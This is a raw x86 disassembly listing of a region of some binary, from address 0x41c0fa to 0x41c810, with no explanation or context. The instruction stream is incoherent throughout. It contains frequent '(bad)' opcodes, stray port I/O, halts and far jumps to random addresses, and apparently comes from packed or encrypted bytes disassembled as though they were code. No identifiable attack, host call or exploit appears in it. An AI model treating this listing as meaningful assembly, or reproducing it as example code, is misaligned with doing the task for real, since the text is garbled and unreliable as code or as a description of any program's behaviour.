  41c0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0fb:	jns    0x41c113
  41c0fd:	sbb    BYTE PTR [edx+edx*1-0x1adfe7e8],bh
  41c104:	jmp    DWORD PTR [edi]
  41c106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c107:	ror    esi,1
  41c109:	fiadd  DWORD PTR [eax]
  41c10b:	icebp  
  41c10c:	mov    bh,0xbc
  41c10e:	shr    BYTE PTR [esi],0x34
  41c111:	and    BYTE PTR [ecx+ebp*8],ah
  41c114:	repz popf 
  41c116:	jns    0x41c153
  41c118:	xor    eax,0x5bf9fe96
  41c11d:	ficomp WORD PTR [ecx-0x381ec00a]
  41c123:	(bad)  
  41c124:	retf   
  41c125:	ss mov edi,0x11832048
  41c12b:	imul   ecx,DWORD PTR [edi+0x10],0xe104f7d
  41c132:	xlat   BYTE PTR ds:[ebx]
  41c133:	mov    esi,0x69e6621b
  41c138:	push   ebx
  41c139:	jno    0x41c11b
  41c13b:	pop    ebp
  41c13c:	mov    al,0xcc
  41c13e:	daa    
  41c13f:	mov    bh,0x60
  41c141:	sbb    al,0xff
  41c143:	into   
  41c144:	dec    esi
  41c145:	xor    bl,BYTE PTR [edx-0x5931da7b]
  41c14b:	push   ecx
  41c14c:	or     ebx,DWORD PTR [esi+0x3c]
  41c14f:	sub    al,0x9a
  41c151:	pop    esp
  41c152:	or     dh,BYTE PTR [ebp-0x48]
  41c155:	bound  edx,QWORD PTR [esi+0x45d254f2]
  41c15b:	pop    eax
  41c15c:	sbb    BYTE PTR [edx],dl
  41c15e:	sbb    eax,0xdb371424
  41c163:	dec    ecx
  41c164:	xchg   BYTE PTR [esi],bl
  41c166:	jecxz  0x41c112
  41c168:	jnp    0x41c190
  41c16a:	mov    WORD PTR [edx],cs
  41c16c:	or     BYTE PTR [ecx],dl
  41c16e:	stos   BYTE PTR es:[edi],al
  41c16f:	es pop es
  41c171:	add    DWORD PTR [ebp+0x5be0d36b],0x109a6afe
  41c17b:	or     eax,0x1d873577
  41c180:	and    BYTE PTR [ecx+0x78e595cb],0x5
  41c187:	test   DWORD PTR [ebx+0x24],0xf77b0df8
  41c18e:	sbb    DWORD PTR [ecx],esp
  41c190:	sbb    edi,DWORD PTR [ebx]
  41c192:	out    0xe,eax
  41c194:	lds    esp,FWORD PTR [edi+0x67]
  41c197:	stc    
  41c198:	sbb    dl,dl
  41c19a:	outs   dx,BYTE PTR ds:[esi]
  41c19b:	int    0x1c
  41c19d:	lods   al,BYTE PTR ds:[esi]
  41c19e:	aaa    
  41c19f:	or     DWORD PTR [ebp+0x11],ecx
  41c1a2:	add    cl,bl
  41c1a4:	xchg   edi,eax
  41c1a5:	(bad)  
  41c1a6:	mov    bh,0x8
  41c1a8:	push   esp
  41c1a9:	pop    es
  41c1aa:	pop    edi
  41c1ab:	add    esi,DWORD PTR [eax-0x1a75fc77]
  41c1b1:	jo     0x41c1c2
  41c1b3:	fs in  al,0x21
  41c1b6:	or     BYTE PTR [edx],bh
  41c1b8:	popa   
  41c1b9:	dec    esp
  41c1ba:	retf   
  41c1bb:	jecxz  0x41c16b
  41c1bd:	jae    0x41c230
  41c1bf:	or     al,bh
  41c1c1:	jno    0x41c1e8
  41c1c3:	jge    0x41c1b4
  41c1c5:	mov    ch,ah
  41c1c7:	xchg   esi,eax
  41c1c8:	bound  esi,QWORD PTR [esi+0x1d]
  41c1cb:	(bad)  
  41c1cc:	enter  0x24d8,0xbc
  41c1d0:	add    DWORD PTR [edi-0x25],ebp
  41c1d3:	pop    esi
  41c1d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1d5:	or     eax,DWORD PTR [ecx+edi*4]
  41c1d8:	mov    ebp,0x4802a7e8
  41c1dd:	mov    eax,0x9914f359
  41c1e2:	outs   dx,BYTE PTR ds:[esi]
  41c1e3:	out    0x32,eax
  41c1e5:	jmp    0xb57a42ab
  41c1ea:	cmp    BYTE PTR [ebx+0x34c0c223],0xa5
  41c1f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1f2:	cmp    DWORD PTR [edx+0x27],esi
  41c1f5:	pop    ss
  41c1f6:	lds    ebx,FWORD PTR [edi+ebp*2-0x25601b2c]
  41c1fd:	and    di,WORD PTR [edx]
  41c200:	push   es
  41c201:	int    0x74
  41c203:	pop    ebp
  41c204:	jne    0x41c1bd
  41c206:	cmp    dl,BYTE PTR [esi-0x2ea42e13]
  41c20c:	jns    0x41c1fb
  41c20e:	adc    BYTE PTR [ecx+eiz*2-0x25519b8a],dh
  41c215:	and    DWORD PTR [edx],esp
  41c217:	dec    edx
  41c218:	push   ds
  41c219:	scas   al,BYTE PTR es:[edi]
  41c21a:	xchg   ebx,eax
  41c21b:	cmp    DWORD PTR [ecx+0x182812d],esi
  41c221:	mov    dh,0xb9
  41c223:	or     edx,edx
  41c225:	cmp    BYTE PTR [edx],dl
  41c227:	inc    esi
  41c228:	ror    BYTE PTR [ecx-0x7b],cl
  41c22b:	mov    ss,WORD PTR [eax]
  41c22d:	daa    
  41c22e:	adc    eax,DWORD PTR [ecx]
  41c230:	inc    ecx
  41c231:	jg     0x41c250
  41c233:	sub    dl,BYTE PTR [ebx]
  41c235:	pop    ecx
  41c236:	sbb    dh,bh
  41c238:	push   ebx
  41c239:	sbb    esi,0xea8789be
  41c23f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c240:	jnp    0x41c1e1
  41c242:	mov    edi,0xe0578f8b
  41c247:	stc    
  41c248:	push   esi
  41c249:	adc    DWORD PTR [eax],esi
  41c24b:	ret    
  41c24c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c24d:	inc    ebp
  41c24e:	add    al,BYTE PTR [eax]
  41c250:	mov    esp,0x74c1f2fb
  41c255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c256:	imul   BYTE PTR [edi]
  41c258:	xchg   dh,ch
  41c25a:	mov    eax,DWORD PTR [edx-0x6b]
  41c25d:	loopne 0x41c266
  41c25f:	cmp    esp,ebx
  41c261:	jmp    0xa488:0xf6b703ee
  41c268:	pop    esp
  41c269:	outs   dx,DWORD PTR ds:[esi]
  41c26a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c26b:	out    dx,eax
  41c26c:	cmp    al,0x55
  41c26e:	adc    eax,0xa4e5f071
  41c273:	adc    al,0x10
  41c275:	outs   dx,DWORD PTR ds:[esi]
  41c276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c277:	imul   edi,DWORD PTR [ecx+eiz*8+0xb12727e],0xa571807
  41c282:	(bad)  
  41c283:	cmp    bh,BYTE PTR [esi+edi*8-0x782ae09f]
  41c28a:	push   ds
  41c28b:	pop    ecx
  41c28c:	iret   
  41c28d:	mov    esi,0x1e770fbf
  41c292:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c293:	(bad)  
  41c294:	icebp  
  41c295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c296:	or     esp,ebx
  41c298:	data16 (bad) 
  41c29b:	sub    ecx,DWORD PTR [ebx]
  41c29d:	xchg   BYTE PTR [ebp-0x33],bh
  41c2a0:	nop
  41c2a1:	in     al,0x55
  41c2a3:	cmp    eax,0xc0caeb68
  41c2a8:	test   DWORD PTR [edi],ebp
  41c2aa:	xchg   BYTE PTR [esp+edx*4-0x238b64c5],cl
  41c2b1:	mov    esi,0xbae7c640
  41c2b6:	mov    bh,0xe6
  41c2b8:	mov    ebp,0xe2edfa6a
  41c2bd:	jo     0x41c30a
  41c2bf:	in     eax,0x29
  41c2c1:	int    0xaa
  41c2c3:	or     bh,BYTE PTR [eax+0x1e12bcd1]
  41c2c9:	xchg   ecx,eax
  41c2ca:	test   al,0x12
  41c2cc:	outs   dx,BYTE PTR ds:[esi]
  41c2cd:	mov    edi,0xcf55f567
  41c2d2:	and    al,0x4d
  41c2d4:	hlt    
  41c2d5:	outs   dx,BYTE PTR ds:[esi]
  41c2d6:	js     0x41c2be
  41c2d8:	push   edi
  41c2d9:	imul   esp,DWORD PTR ds:0xc925485f,0xfffffffe
  41c2e0:	pop    ebp
  41c2e1:	push   edx
  41c2e2:	push   0x2
  41c2e4:	xlat   BYTE PTR ds:[ebx]
  41c2e5:	jbe    0x41c318
  41c2e7:	adc    DWORD PTR [eax+0x6f],eax
  41c2ea:	push   edx
  41c2eb:	pop    es
  41c2ec:	into   
  41c2ed:	arpl   bp,bx
  41c2ef:	jo     0x41c2ff
  41c2f1:	in     eax,0xd0
  41c2f3:	cmp    al,0xcb
  41c2f5:	cmp    ch,BYTE PTR [eax+0x229f4d50]
  41c2fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2fc:	shl    DWORD PTR es:[ecx-0x4127486d],0x4a
  41c304:	test   eax,0x639add9f
  41c309:	inc    ecx
  41c30a:	(bad)  
  41c30b:	mov    cl,0xbe
  41c30d:	xchg   edi,eax
  41c30e:	jecxz  0x41c33d
  41c310:	addr16 pop edi
  41c312:	jp     0x41c36c
  41c314:	cmp    al,0x3f
  41c316:	mov    dl,0x98
  41c318:	leave  
  41c319:	or     cl,BYTE PTR [esi]
  41c31b:	xchg   ebp,eax
  41c31c:	mov    ah,0xc9
  41c31e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c31f:	jno    0x41c301
  41c321:	jecxz  0x41c319
  41c323:	sub    bh,BYTE PTR [esp+edi*4-0x7f]
  41c327:	pop    es
  41c328:	add    al,0x48
  41c32a:	inc    edi
  41c32b:	inc    esi
  41c32c:	xchg   edi,eax
  41c32d:	bound  ebx,QWORD PTR [ebp+0x37]
  41c330:	sbb    al,0xae
  41c332:	xlat   BYTE PTR ds:[ebx]
  41c333:	test   BYTE PTR [esp+eiz*4],cl
  41c336:	fstp   TBYTE PTR [ebp+0xf4b5c9]
  41c33c:	add    al,0x48
  41c33e:	mov    eax,0x2746f21
  41c343:	aas    
  41c344:	in     al,dx
  41c345:	jecxz  0x41c330
  41c347:	sbb    al,BYTE PTR [edx+esi*1]
  41c34a:	or     eax,0xb837770f
  41c34f:	mov    ss,WORD PTR [esi]
  41c351:	popf   
  41c352:	or     ecx,ebx
  41c354:	adc    eax,0x412718c2
  41c359:	sbb    al,BYTE PTR [bx]
  41c35c:	outs   dx,BYTE PTR ds:[esi]
  41c35d:	ror    BYTE PTR [ebx+0x2d],cl
  41c360:	es xchg edx,eax
  41c362:	stos   BYTE PTR es:[edi],al
  41c363:	(bad)  
  41c364:	outs   dx,BYTE PTR ds:[esi]
  41c365:	das    
  41c366:	loop   0x41c349
  41c368:	cdq    
  41c369:	mov    DWORD PTR [esi-0x614bc2ef],ebp
  41c36f:	jnp    0x41c334
  41c371:	aaa    
  41c372:	dec    edi
  41c373:	rcl    DWORD PTR [eax+0x28],cl
  41c376:	mov    edi,0x349d6729
  41c37b:	sub    eax,0x5acee180
  41c380:	scas   eax,DWORD PTR es:[edi]
  41c381:	and    BYTE PTR [esi],0x1d
  41c384:	or     eax,esp
  41c386:	les    ecx,FWORD PTR [esi+0x7e]
  41c389:	inc    ebp
  41c38a:	or     ecx,DWORD PTR [eax]
  41c38c:	retf   
  41c38d:	out    0xcd,al
  41c38f:	mov    edi,0x804b5aef
  41c394:	pop    ebp
  41c395:	ins    DWORD PTR es:[edi],dx
  41c396:	(bad)  
  41c397:	fcmovne st,st(7)
  41c399:	jo     0x41c38f
  41c39b:	aad    0x8d
  41c39d:	cs es cmc 
  41c3a0:	iret   
  41c3a1:	push   ss
  41c3a2:	inc    ebp
  41c3a3:	(bad)  
  41c3a4:	retf   
  41c3a5:	sar    DWORD PTR [edx-0x4c1328e9],0xbe
  41c3ac:	mov    ds:0x681d9bda,eax
  41c3b1:	mov    ch,0x24
  41c3b3:	repz fwait
  41c3b5:	fwait
  41c3b6:	lock add dl,BYTE PTR [edx+0x3c85af17]
  41c3bd:	xchg   esi,eax
  41c3be:	xchg   esp,eax
  41c3bf:	or     DWORD PTR [edi+0x1240af28],ecx
  41c3c5:	in     eax,0xd4
  41c3c7:	push   eax
  41c3c8:	mov    edx,0x4e8a0a87
  41c3cd:	outs   dx,DWORD PTR ds:[esi]
  41c3ce:	call   0x1dc0:0x15483b8a
  41c3d5:	push   ebp
  41c3d6:	dec    edx
  41c3d7:	fdiv   st(0),st
  41c3d9:	push   es
  41c3da:	mov    ebx,DWORD PTR [eax-0x54]
  41c3dd:	es inc esp
  41c3df:	retf   
  41c3e0:	or     eax,0xea6a9db2
  41c3e5:	out    0x71,eax
  41c3e7:	lods   al,BYTE PTR ds:[esi]
  41c3e8:	jbe    0x41c3a6
  41c3ea:	in     al,dx
  41c3eb:	add    al,0xad
  41c3ed:	cmp    esi,DWORD PTR [ebx+0x4e]
  41c3f0:	rol    DWORD PTR [eax],cl
  41c3f2:	mov    al,ds:0x3a9d674a
  41c3f7:	mul    DWORD PTR [eax-0x2d6a688e]
  41c3fd:	lahf   
  41c3fe:	jecxz  0x41c47f
  41c400:	pop    esp
  41c401:	push   edi
  41c402:	ret    
  41c403:	cwde   
  41c404:	jecxz  0x41c390
  41c406:	into   
  41c407:	jecxz  0x41c417
  41c409:	and    dh,ch
  41c40b:	mov    edi,0xf6787a16
  41c410:	pop    eax
  41c411:	in     eax,0x99
  41c413:	cli    
  41c414:	mov    WORD PTR [edx-0x37],?
  41c417:	fisttp QWORD PTR [esp+ebp*4-0x2b4e9ee7]
  41c41e:	jo     0x41c451
  41c420:	jno    0x41c480
  41c422:	fist   WORD PTR [esi]
  41c424:	pop    edi
  41c425:	lahf   
  41c426:	mov    ds:0x6ab0038,al
  41c42b:	retf   0xf427
  41c42e:	xchg   ecx,eax
  41c42f:	xchg   esi,eax
  41c430:	out    dx,eax
  41c431:	clc    
  41c432:	sbb    dl,BYTE PTR [ecx-0x78]
  41c435:	ret    0xfcfa
  41c438:	jp     0x41c46e
  41c43a:	jae    0x41c3d4
  41c43c:	cmp    dl,BYTE PTR [edx]
  41c43e:	arpl   si,cx
  41c440:	xchg   esp,eax
  41c441:	scas   al,BYTE PTR es:[edi]
  41c442:	jmp    0x3bfef324
  41c447:	scas   al,BYTE PTR es:[edi]
  41c448:	mov    esp,0x85d40f3d
  41c44d:	jne    0x41c499
  41c44f:	or     al,0x32
  41c451:	xor    al,BYTE PTR [eax]
  41c453:	xor    bl,BYTE PTR [ebp-0x600fcff0]
  41c459:	push   edi
  41c45a:	add    esp,DWORD PTR [ebx-0x2f]
  41c45d:	in     al,0xa4
  41c45f:	call   0x5ddcc3be
  41c464:	es jmp 0x88b8:0xcd414d42
  41c46c:	sbb    cl,al
  41c46e:	or     DWORD PTR [eax-0x27],esi
  41c471:	xchg   edx,eax
  41c472:	jle    0x41c3f6
  41c474:	and    DWORD PTR [edx+0x4f],ebp
  41c477:	pop    ebx
  41c478:	test   eax,0x2863b4ed
  41c47d:	cmp    DWORD PTR [edx-0xe4d5d57],esp
  41c483:	mov    ebx,0x51215c77
  41c488:	jp     0x41c40d
  41c48a:	pop    ebx
  41c48b:	push   esp
  41c48c:	inc    esp
  41c48d:	pop    es
  41c48e:	paddusw mm1,QWORD PTR [eax-0x55]
  41c492:	idiv   DWORD PTR [esi]
  41c494:	js     0x41c4fa
  41c496:	test   BYTE PTR [edi+0x76],ah
  41c499:	hlt    
  41c49a:	xlat   BYTE PTR ds:[ebx]
  41c49b:	jne    0x41c508
  41c49d:	dec    esi
  41c49e:	pop    ss
  41c49f:	js     0x41c50a
  41c4a1:	out    dx,al
  41c4a2:	jne    0x41c463
  41c4a4:	outs   dx,DWORD PTR ds:[esi]
  41c4a5:	sar    ah,0x5b
  41c4a8:	dec    eax
  41c4a9:	mov    ah,0x77
  41c4ab:	loop   0x41c513
  41c4ad:	pop    ss
  41c4ae:	pop    esp
  41c4af:	in     al,0x3
  41c4b1:	xchg   edx,eax
  41c4b2:	mov    eax,0x891ce899
  41c4b7:	(bad)  
  41c4b8:	(bad)  
  41c4b9:	jmp    0x41c888
  41c4be:	inc    edi
  41c4bf:	and    edi,DWORD PTR [eax]
  41c4c1:	sbb    DWORD PTR [ebx+eax*1],esi
  41c4c4:	daa    
  41c4c5:	and    cl,BYTE PTR [ebx]
  41c4c7:	cdq    
  41c4c8:	lahf   
  41c4c9:	jo     0x41c4ee
  41c4cb:	mov    ch,0xa5
  41c4cd:	mov    esp,0x1816734a
  41c4d2:	mov    esp,0x99181812
  41c4d7:	imul   edi,DWORD PTR [ecx+eiz*8],0xffffff92
  41c4db:	call   0x4e66:0xd15011e9
  41c4e2:	pop    esi
  41c4e3:	inc    edi
  41c4e4:	mov    edx,edi
  41c4e6:	jg     0x41c520
  41c4e8:	rol    BYTE PTR [ebp-0x6a],1
  41c4eb:	rcr    BYTE PTR [eax+0x67],1
  41c4ee:	(bad)  
  41c4ef:	scas   eax,DWORD PTR es:[edi]
  41c4f0:	retf   
  41c4f1:	sub    eax,0x16bbb76b
  41c4f6:	mov    dh,0x7e
  41c4f8:	jmp    0x4b50e733
  41c4fd:	xor    bl,ah
  41c4ff:	idiv   DWORD PTR [ecx+0x70]
  41c502:	mov    edi,0xc3e93be4
  41c507:	pop    ss
  41c508:	stc    
  41c509:	jno    0x41c55f
  41c50b:	aas    
  41c50c:	sti    
  41c50d:	and    edi,edi
  41c50f:	mov    ecx,0x4a4959ba
  41c514:	xchg   esp,eax
  41c515:	sub    bl,BYTE PTR [ecx+0x41235ded]
  41c51b:	icebp  
  41c51c:	dec    eax
  41c51d:	ret    0xa0f7
  41c520:	rcl    DWORD PTR [ecx+0x17b17b05],1
  41c526:	xor    eax,0x5bbe3a5b
  41c52b:	aaa    
  41c52c:	xor    al,0x42
  41c52e:	xchg   BYTE PTR [eax+0x434820d7],dh
  41c534:	pop    edi
  41c535:	cwde   
  41c536:	mov    BYTE PTR [esi-0x1b8505f4],bl
  41c53c:	mov    bl,0x98
  41c53e:	push   ebx
  41c53f:	aam    0x85
  41c541:	daa    
  41c542:	jmp    0xdd0bc5a9
  41c547:	test   DWORD PTR ds:0xbf9ab6ae,esp
  41c54d:	outs   dx,DWORD PTR ds:[esi]
  41c54e:	push   edi
  41c54f:	mov    ds:0x165e165e,al
  41c554:	inc    esp
  41c555:	inc    ecx
  41c556:	aas    
  41c557:	push   es
  41c558:	pop    bx
  41c55a:	pusha  
  41c55b:	add    BYTE PTR [edx+edx*1-0x1b],dl
  41c55f:	shl    DWORD PTR [eax],1
  41c561:	cmp    BYTE PTR [ebp+0x32],cl
  41c564:	mov    bh,0xd8
  41c566:	adc    dl,bl
  41c568:	and    DWORD PTR [eax+ebx*1-0x42],edi
  41c56c:	and    edi,DWORD PTR ds:0xaac9b004
  41c572:	inc    esi
  41c573:	cmp    BYTE PTR [ecx+0x2f73a6dd],bh
  41c579:	xchg   BYTE PTR [ebp-0x1020cf7f],dh
  41c57f:	jb     0x41c5af
  41c581:	mov    dl,0xa2
  41c583:	mov    cl,0xc6
  41c585:	push   es
  41c586:	adc    bh,al
  41c588:	and    DWORD PTR [ebx],eax
  41c58a:	jp     0x41c5e9
  41c58c:	push   esi
  41c58d:	jmp    0x41c559
  41c58f:	scas   al,BYTE PTR es:[edi]
  41c590:	mov    eax,DWORD PTR [ebp-0x60]
  41c593:	mov    dh,0x10
  41c595:	inc    ebp
  41c596:	clc    
  41c597:	mov    al,0xa8
  41c599:	rcl    bl,0xaf
  41c59c:	mov    al,0x8
  41c59e:	(bad)  
  41c59f:	mov    edx,0x1cc3390
  41c5a4:	inc    edi
  41c5a5:	dec    eax
  41c5a6:	mov    ebp,0x54a133fe
  41c5ab:	sub    edi,DWORD PTR [ebx+edi*1-0x4b]
  41c5af:	js     0x41c57f
  41c5b1:	icebp  
  41c5b2:	sbb    bl,al
  41c5b4:	mov    ebp,0xa268fb0d
  41c5b9:	jne    0x41c602
  41c5bb:	int3   
  41c5bc:	dec    edx
  41c5bd:	mov    ?,WORD PTR [ebp-0x48389725]
  41c5c3:	loopne 0x41c60a
  41c5c5:	pop    edx
  41c5c6:	xor    edi,edx
  41c5c8:	jnp    0x41c600
  41c5ca:	scas   eax,DWORD PTR es:[edi]
  41c5cb:	xchg   esi,eax
  41c5cc:	jmp    0x1336:0xc7e7adc8
  41c5d3:	fld1   
  41c5d5:	jmp    0x2e3542ce
  41c5da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5db:	out    dx,al
  41c5dc:	cmp    eax,ecx
  41c5de:	jnp    0x41c5b2
  41c5e0:	sub    BYTE PTR [edi+0x55],bl
  41c5e3:	mov    bh,bh
  41c5e5:	cmp    eax,0x1071894
  41c5ea:	xchg   edx,esi
  41c5ec:	daa    
  41c5ed:	(bad)  
  41c5ee:	jbe    0x41c586
  41c5f0:	xchg   edx,eax
  41c5f1:	or     DWORD PTR [ebp-0x72ceeca9],edi
  41c5f7:	add    eax,0x2b900da
  41c5fc:	pop    edx
  41c5fd:	inc    edi
  41c5fe:	shl    edi,1
  41c600:	rcl    bh,cl
  41c602:	std    
  41c603:	mov    ch,0x40
  41c605:	pushf  
  41c606:	inc    ebx
  41c607:	scas   eax,DWORD PTR es:[edi]
  41c608:	or     esi,DWORD PTR [edx+0x10]
  41c60b:	shl    BYTE PTR [esp+eiz*2+0x15],cl
  41c60f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c610:	sar    BYTE PTR [esp+edi*2+0x50e13a4],0x57
  41c618:	pop    edx
  41c619:	xor    DWORD PTR [edi+esi*1],edx
  41c61c:	out    dx,al
  41c61d:	cdq    
  41c61e:	or     esi,DWORD PTR [eax]
  41c620:	cwde   
  41c621:	ret    
  41c622:	out    0xf5,eax
  41c624:	pop    es
  41c625:	ret    0x5074
  41c628:	jmp    DWORD PTR [edi+0x206850d2]
  41c62e:	loope  0x41c5d3
  41c630:	jbe    0x41c625
  41c632:	(bad)  
  41c633:	cwde   
  41c634:	adc    al,0xb6
  41c636:	sub    BYTE PTR [edx+0x8],bl
  41c639:	out    dx,eax
  41c63a:	mov    ebx,0xecab0cf0
  41c63f:	dec    esi
  41c640:	ins    BYTE PTR es:[edi],dx
  41c641:	add    edx,ebp
  41c643:	lods   eax,DWORD PTR ds:[esi]
  41c644:	push   0xbd290152
  41c649:	push   eax
  41c64a:	cmp    bl,BYTE PTR [ebx+ebx*8]
  41c64d:	push   ebp
  41c64e:	mov    ebx,0xfadb5815
  41c653:	hlt    
  41c654:	jb     0x41c6cb
  41c656:	mov    BYTE PTR ds:[ecx+edi*2+0x73],0xcf
  41c65c:	mov    ecx,0x25019b2e
  41c661:	jo     0x41c61e
  41c663:	push   esp
  41c664:	ds jns 0x41c6ac
  41c667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c668:	fcmovnb st,st(1)
  41c66a:	add    edi,DWORD PTR [edi+0x2c24bea6]
  41c670:	push   ds
  41c671:	push   eax
  41c672:	icebp  
  41c673:	sbb    cl,BYTE PTR [edx]
  41c675:	js     0x41c69c
  41c677:	mov    esi,0x72769b4c
  41c67c:	(bad)  
  41c67e:	in     al,0x50
  41c680:	mov    dl,0x52
  41c682:	jle    0x41c690
  41c684:	sahf   
  41c685:	push   esp
  41c686:	and    al,BYTE PTR [edi+0x1c]
  41c689:	mov    eax,ds:0xfacbeca9
  41c68e:	das    
  41c68f:	jmp    0xe223350c
  41c694:	ds (bad) 
  41c697:	or     al,cl
  41c699:	pop    edx
  41c69a:	lea    ecx,ds:0x5a67ee7d
  41c6a0:	clc    
  41c6a1:	leave  
  41c6a2:	dec    eax
  41c6a3:	xor    BYTE PTR [edi-0x4b],dh
  41c6a6:	cmp    eax,0xa7d35ed6
  41c6ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6ac:	idiv   BYTE PTR [esi]
  41c6ae:	ins    BYTE PTR es:[edi],dx
  41c6af:	sub    DWORD PTR [ebx],ebp
  41c6b1:	push   0xedf20cc3
  41c6b6:	xlat   BYTE PTR ds:[ebx]
  41c6b7:	mov    ds:0x1078c587,al
  41c6bc:	ds pusha 
  41c6be:	or     eax,0x603d2d8d
  41c6c3:	pop    edi
  41c6c4:	cmp    ebx,DWORD PTR [eax+edx*2-0x4e]
  41c6c8:	jbe    0x41c6cf
  41c6ca:	mov    ecx,0x536980e2
  41c6cf:	sbb    ecx,DWORD PTR [eax+0x13]
  41c6d2:	xchg   ebp,eax
  41c6d3:	jge    0x41c728
  41c6d5:	mov    DWORD PTR [eax],edi
  41c6d7:	es int3 
  41c6d9:	inc    edx
  41c6da:	icebp  
  41c6db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6dc:	xlat   BYTE PTR ds:[ebx]
  41c6dd:	cmc    
  41c6de:	(bad)  
  41c6df:	(bad)  
  41c6e0:	das    
  41c6e1:	mov    ds:0x6f2b4bd9,al
  41c6e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6e7:	push   ebx
  41c6e8:	sub    cl,BYTE PTR [esi+0x6d]
  41c6eb:	and    eax,0x37adcdff
  41c6f0:	nop
  41c6f1:	(bad)  
  41c6f2:	fs ja  0x41c741
  41c6f5:	call   0xc233c67d
  41c6fa:	dec    esi
  41c6fb:	mov    ecx,0x9d76ad00
  41c700:	push   esi
  41c701:	xchg   edx,eax
  41c702:	or     BYTE PTR [ebx],0x7d
  41c705:	js     0x41c689
  41c707:	inc    edi
  41c708:	pop    esi
  41c709:	mov    WORD PTR [ecx],?
  41c70b:	outs   dx,DWORD PTR ds:[esi]
  41c70c:	pop    ebp
  41c70d:	mov    esi,0x824377ac
  41c712:	gs clc 
  41c714:	xchg   esi,eax
  41c715:	xor    DWORD PTR [esi-0x6f5c03dc],ebx
  41c71b:	jnp    0x41c772
  41c71d:	test   BYTE PTR es:[esi-0x6b],0x1e
  41c722:	cmp    DWORD PTR [ebx-0x16],ecx
  41c725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c726:	sbb    eax,0x9f7488be
  41c72b:	jle    0x41c730
  41c72d:	fidivr DWORD PTR [eax]
  41c72f:	call   0xbc19:0xf7843c61
  41c736:	lods   eax,DWORD PTR ds:[esi]
  41c737:	enter  0xcadf,0x5c
  41c73b:	inc    esi
  41c73c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c73d:	lahf   
  41c73e:	sub    DWORD PTR [si],esi
  41c741:	pop    eax
  41c742:	fldcw  WORD PTR ds:0xaff4abcc
  41c748:	push   edx
  41c749:	mov    BYTE PTR [esi+0x69bef970],cl
  41c74f:	cmp    dh,dh
  41c751:	sub    BYTE PTR [esi+eiz*1-0x6415c7d8],0x71
  41c759:	pop    DWORD PTR [esi-0x1c786d36]
  41c75f:	shr    DWORD PTR ds:0x4131c43d,cl
  41c765:	outs   dx,BYTE PTR ds:[esi]
  41c766:	fist   WORD PTR ds:0xe9c83f8b
  41c76c:	ror    bh,cl
  41c76e:	aas    
  41c76f:	xchg   edx,eax
  41c770:	cmp    bh,al
  41c772:	jmp    0x7246:0x897dfe4a
  41c779:	mov    bl,0x13
  41c77b:	lea    edi,[edi+0x72]
  41c77e:	fistp  QWORD PTR [ecx]
  41c780:	(bad)  
  41c781:	out    dx,eax
  41c782:	outs   dx,DWORD PTR ds:[esi]
  41c783:	sbb    ah,al
  41c785:	clc    
  41c786:	scas   al,BYTE PTR es:[edi]
  41c787:	cmp    eax,0xf9815897
  41c78c:	jae    0x41c724
  41c78e:	jge    0x41c804
  41c790:	enter  0xbf82,0xf0
  41c794:	xchg   DWORD PTR [esi],esi
  41c796:	or     edx,DWORD PTR [esi+eiz*4]
  41c799:	cmp    ebp,DWORD PTR [esi]
  41c79b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c79c:	adc    eax,0x589925c4
  41c7a1:	loop   0x41c7ee
  41c7a3:	sub    bh,dl
  41c7a5:	das    
  41c7a6:	and    DWORD PTR [edi-0x39],ebp
  41c7a9:	cmc    
  41c7aa:	mov    cl,BYTE PTR [esi-0x3e9bdf24]
  41c7b0:	aad    0xe8
  41c7b2:	and    DWORD PTR [esi],esi
  41c7b4:	call   0x713bba2f
  41c7b9:	sub    edi,DWORD PTR [ebp-0x3b]
  41c7bc:	(bad)  
  41c7bd:	out    dx,eax
  41c7be:	dec    ebx
  41c7bf:	ins    BYTE PTR es:[edi],dx
  41c7c0:	or     ebp,esp
  41c7c2:	test   ecx,eax
  41c7c4:	inc    ebx
  41c7c5:	push   edx
  41c7c6:	cmc    
  41c7c7:	mov    ebp,0x234ad2d2
  41c7cc:	icebp  
  41c7cd:	jle    0x41c751
  41c7cf:	(bad)  
  41c7d0:	jge    0x41c7b7
  41c7d2:	lahf   
  41c7d3:	(bad)
  41c7d6:	popa   
  41c7d7:	xlat   BYTE PTR ds:[ebx]
  41c7d8:	cs xchg esi,eax
  41c7da:	repnz and BYTE PTR [ecx+0x0],bh
  41c7de:	jmp    0x46a0c88b
  41c7e3:	mov    ecx,0xfd2c67af
  41c7e8:	icebp  
  41c7e9:	ficomp DWORD PTR gs:[ecx+0x16]
  41c7ed:	test   esp,esp
  41c7ef:	retf   
  41c7f0:	ins    DWORD PTR es:[edi],dx
  41c7f1:	outs   dx,DWORD PTR ds:[esi]
  41c7f2:	push   ebp
  41c7f3:	out    dx,eax
  41c7f4:	mov    ds:0x7add5740,al
  41c7f9:	or     edi,DWORD PTR [edx+0x54e2f4d]
  41c7ff:	cmp    eax,0xa4f48ee7
  41c804:	push   edi
  41c805:	(bad)  
  41c806:	pop    esp
  41c807:	sbb    DWORD PTR [eax-0x5ec46897],edx
  41c80d:	ret    0xb92e
  41c810:	dec    esp
